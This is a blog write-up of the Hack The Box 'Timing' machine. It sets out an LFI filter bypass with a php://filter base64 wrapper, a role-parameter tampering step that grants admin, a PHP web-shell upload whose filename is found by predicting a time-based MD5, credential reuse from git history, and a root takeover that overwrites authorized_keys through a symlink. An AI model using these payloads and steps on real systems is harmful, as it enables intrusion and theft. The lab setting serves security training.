---
title: "Timing -Hack The Box"
subtitle: ""
date: 2020-03-04T15:58:26+08:00
lastmod: 2020-03-04T15:58:26+08:00
draft: false
author: ""
authorLink: ""
description: ""
license: ""
images: []

tags: [LFI vulnerability, PHP wrapper with base64 encoding, RCE, SSH password cracking, Netutils abuse, Root access, Hack The Box, Enumeration, Web server security, File inclusion attacks, PHP web server, Git repository enumeration, Admin panel, Image upload vulnerability, Authorized keys abuse]
categories: ['HackThebox','CTF']

featuredImage: "/img/Timing.png"
featuredImagePreview: "/img/Timing.png"

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
  # ...
mapbox:
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...
---

Timing -Hack The Box

### Summary

Timing is the Hack The Box boot2root machine which is a fun box with a lot of enumeration.
The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter "?img=" if we pass /etc/passwd the server simply responds with a message "hacking detected" if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability. Reading the /etc/passwd we got the username aaron login the web with credentials aaron:aaron after login it has an edit profile menu which gave them access to the admin panel and allow us to upload image after the uploading the image with php payload we must find the file name and get the RCE, enumerating the server directories we find a backup file in the /opt directory it contains a git repository enumerating the file we find ssh password access the machine through ssh after that abuse the netutils to overwrite the authorized_keys and get root access

### Recon

Run the nmap scan:

```bash
# Nmap 7.92 scan initiated Fri Jan 28 23:12:43 2022 as: nmap -sCV -A -o nmapscan.txt 10.10.11.135
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.65s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 23:14:33 2022 -- 1 IP address (1 host up) scanned in 110.52 seconds
```

Notice the two usual and classic open ports: ssh on port 22 and http on port 80 I immediately put the domain timing.htb in my /etc/hosts file and I also noticed the login.php file name which means it is a PHP  server 

Navigating the web http://timing.htb it's running
a simple web app with a login page

![Test Image](/img/timing1.png)

let's check hidden files and subdirectory using gobuster 

```html
gobuster dir -u http://timing.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://timing.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/01/28 01:56:28 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.html.txt            (Status: 403) [Size: 275]
/login.php            (Status: 200) [Size: 5609]
/.html.php            (Status: 403) [Size: 275] 
/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]    
/index.php            (Status: 302) [Size: 0] [--> ./login.php]                
/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]   
/.htm                 (Status: 403) [Size: 275]                                
/.htm.php             (Status: 403) [Size: 275]                                
/.htm.txt             (Status: 403) [Size: 275]                                
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]                
/image.php            (Status: 200) [Size: 0]                                  
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                
/header.php           (Status: 302) [Size: 0] [--> ./login.php]                
/footer.php           (Status: 200) [Size: 3937]                               
/.                    (Status: 302) [Size: 0] [--> ./login.php]                
Progress: 1353 / 129012 (1.05%)                                                                                                                            
===============================================================
2022/01/28 01:58:00 Finished
===============================================================
```

The result is showing an interesting one which is an image.php file
accessing the image.php it doesn't contain body or content 

![Test Image](/img/timing2.png)

fuzzing the image.php file parameter using ffuf

```html
ffuf -u http://timing.htb/image.php?FUZZ=/etc/passwd -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0 -mc all  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://timing.htb/image.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Check the parameter "?img=" with /etc/passwd in burp suite the server sends a response message "hacking detected" which means the server is blocking our request 

![Test Image](/img/timing3.png)

I try to bypass the filtering method with php://filter wrappers 
http://example.com/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd

![Test Image](/img/timing4.png)

it successfully vulnerable to LFI

```html
┌──(kali㉿vm)-[~/HTB/timing]
└─$ echo -n 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

Decoding the base64 encoding data and the user is aaron

Try to log in the web using default credentials (aaron:aaron)

![Test Image](/img/timing5.png)

we logged in as user2 and it has an edit profile menu.

![Test Image](/img/timing6.png)

I have already read all the .php files using LFI there is a file called "admin_auth_check.php". It defines role!=1 no permission to admin panel so role=1 is the admin role.
Capture the edit profile request in the burp repeater and then check the response.
The response is JSON data with role parameter that is 0 

admin_auth_check.php

![Alt text](/img/timing_admin_auth.png)

Respone in Burp repeater

![Test Image](/img/timing7.png)


Manipulating the request to add the role parameter role=1


![Test Image](/img/timing8.png)

Yes, I successfully change the user role to admin role. After that I refresh the page now I can access the admin panel that allow us to upload
images.

![Test Image](/img/timing9.png)

Upload.php which is the backend code for
uploading images.

```php
$upload_dir= "images/uploads/";

$file hash uniqid();

$file name = md5('$file hash' time()). ["name"]);

$target_file = Supload dir Sfile name;

$error =

$imageFileType = strtolower(pathinfo(Starget_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {

Scheck = getimagesize($_FILES["fileToupload"]["tmp_name"]);

if ($check === false) ( Serror = "Invalid file":

if (SimageFileType = "jpg") {

Serror="This extension is not allowed.";
```

Above code is what we will look into. Uploaded files will be moved to */images/uploads/' directory. File Extension must have jpg', and upon upload the filename will be changed to MD5 sum. The logic behind creating this MD5 sum is, it takes two things as input, $file hash' and 'time())' and then adds the base filename of uploaded file to that hash.

>According to PHP, uniqid() function generates a unique ID based on the microtime (the current time in microseconds). In PHP single quote (') and double quote(") have different meanings and interpretations.

>Single quoted strings will display things almost completely "as is.". Double quote 
strings will display a host of escaped characters (including some regexes), and
variables in the strings will be evaluated.

So, uniqid() is just a rabbit hole, it is taking sfile hash as string to generate MD5 hash. However, time()) is also being used as factor to generate MDS. It is considering current time in seconds, that means every second will get a new hash. 

We need to match the upload time to get the right hash. For that we need to make sure our local machine time is not far behind or a head.

```html
┌──(kali㉿vm)-[~/HTB/timing]
└─$ nmap -p80 --script http-date timing.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-18 17:04 GMT
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.27s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-date: Fri, 18 Feb 2022 17:04:43 GMT; +30s from local time.

Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds
```

```html                                                        
┌──(kali㉿vm)-[~/HTB/timing]
└─$ date
Fri Feb 18 17:04:13 PM GMT 2022
```

You can check the date and match it with your time using nmap. Target is-16 seconds behind from my local time. You just need to confirm time, make sure to set your time to GMT.

```html
cat payload.jpg 
<?php system($_GET[cmd]);?> 
```

Create a jpg file with PHP code which can give code execution access. Now we need to start a PHP interactive shell, where we run continuously run PHP code to generate hash based on time and string.

```html                                    
┌──(kali㉿vm)-[~/HTB/timing]
└─$ php -a
Interactive shell

php > while (true){echo date("D M J G:i:s T y"); echo "=" ; echo md5('$file_hash' . time());echo "\n";sleep(1);}
Fri Feb J 17:10:09 UTC 22=46f86e00cdc28dfdd17140ab650f253c
Fri Feb J 17:10:10 UTC 22=ae30812a01e35558eb19edb80c0f5f43
Fri Feb J 17:10:11 UTC 22=3c400e04e2dbd18e5b279f8d9f0437e2
Fri Feb J 17:10:12 UTC 22=bc85022b6ba0af3fd2b68116784e981a
Fri Feb J 17:10:13 UTC 22=ba90f0d034a883a4bb9f51c2d89b846d
```

Keep it going, do not terminate it. Now we need to upload that recently created jpg file, intercept the upload request, send it to repeater, check the response time and match the time with PHP hash.

![Test Image](/img/timing10.png)

Check burp response time and find the matching hash of that time from PHP interactive session.

```html
┌──(kali㉿vm)-[~/HTB/timing]
└─$ php -a
Interactive shell

php > while (true){echo date("D M J G:i:s T y"); echo "=" ; echo md5('$file_hash' . time());echo "\n";sleep(1);}
Fri Feb J 17:11:22 UTC 22=08576e1d40eb90b0be4bd88cfb9dfb6e
Fri Feb J 17:11:23 UTC 22=aadec32bafe6cc4e5e52af30a272fcc1
Fri Feb J 17:11:24 UTC 22=77a0ca1126765779fd995e6ca385f1ba
Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9
Fri Feb J 17:11:26 UTC 22=dfee1b4cb23db563252d16081c58d098
Fri Feb J 17:11:27 UTC 22=507185ca9da790587f30e3b62f60e2d5
Fri Feb J 17:11:28 UTC 22=bf382cf682d3e9d14e244f68edcba071
```

The time matched hash is **Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9**

now let's excuited our uploaded payload through
http://timing.htb/image.php?img=images/uploads/8e055d3f73b750172035beb253c5d2e9_payload.jpg&cmd=id

![Test Image](/img/timing11.png)

Here, we have the RCE we try to get back a reverse shell but we can't get a shell with the www-data user, it's like he has outside connections restriction so we try to enumerate the server directory we find a backup file in the opt directory. 

![Test Image](/img/timing12.png)


Copy the file to the webserver root directory and get the file to our machine

![Test Image](/img/timing13.png)


Unzip the file it contains the git repository

```html
┌──(kali㉿vm)-[~/HTB/timing/zip/backup]
└─$ ls -la
total 76
drwxr-xr-x 6 kali kali 4096 Jul 20  2021 .
drwxr-xr-x 3 kali kali 4096 Feb 15 08:12 ..
-rw-r--r-- 1 kali kali  200 Jul 20  2021 admin_auth_check.php
-rw-r--r-- 1 kali kali  373 Jul 20  2021 auth_check.php
-rw-r--r-- 1 kali kali 1268 Jul 20  2021 avatar_uploader.php
drwxr-xr-x 2 kali kali 4096 Jul 20  2021 css
-rw-r--r-- 1 kali kali   92 Jul 20  2021 db_conn.php
-rw-r--r-- 1 kali kali 3937 Jul 20  2021 footer.php
drwxr-xr-x 8 kali kali 4096 Feb 15 08:21 .git
-rw-r--r-- 1 kali kali 1498 Jul 20  2021 header.php
-rw-r--r-- 1 kali kali  507 Jul 20  2021 image.php
drwxr-xr-x 3 kali kali 4096 Jul 20  2021 images
-rw-r--r-- 1 kali kali  188 Jul 20  2021 index.php
drwxr-xr-x 2 kali kali 4096 Jul 20  2021 js
-rw-r--r-- 1 kali kali 2074 Jul 20  2021 login.php
-rw-r--r-- 1 kali kali  113 Jul 20  2021 logout.php
-rw-r--r-- 1 kali kali 3041 Jul 20  2021 profile.php
-rw-r--r-- 1 kali kali 1740 Jul 20  2021 profile_update.php
-rw-r--r-- 1 kali kali  984 Jul 20  2021 upload.php
```

let's enumerate the git repository we use the command show 
which is used to "Show various types of objects"

```html
git show
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

we discovered two passwords let connect the machine through ssh with these
Credentials and user as aaron

```html
ssh aaron@timing.htb
aaron@timing.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 18 17:50:36 UTC 2022

  System load:  0.02              Processes:           184
  Usage of /:   50.8% of 4.85GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.11.135
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb 18 16:02:26 2022 from 10.10.14.113
aaron@timing:~$ls
user.txt
aaron@timing:~$ cat user.txt 
ad8d3e305b33cbfce293fc1e0bd47ca9
```

we got the user flag. Now we need to perform privilege escalation, so let's check what we can start as a superuser without using the password.

```html
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
 
 aaron@timing:~$ cat /usr/bin/netutils 
#! /bin/bash
java -jar /root/netutils.jar    
```

It is running netutils.jar as root.
which is inside the root folder so we can't view that.
When we run the program from the root user it gets remote file and saves it with root permission in aaron home directory.


![Test Image](/img/timing14.png)


So, I decided to create a symbolic link in /root/.ssh/authorized_keys with keys using our public key. when we get the file with the same name 
it overwrites the authorized_keys.

let's create the ssh key in our machine rename the id_rsa.pub to keys and run
a python simple server.

![Test Image](/img/timing15.png)

Now the file is fetched there is no new file created that means
our keys file is overwritten to authorized_keys.
Let's login with our id_rsa 

![Test Image](/img/timing16.png)

pwned


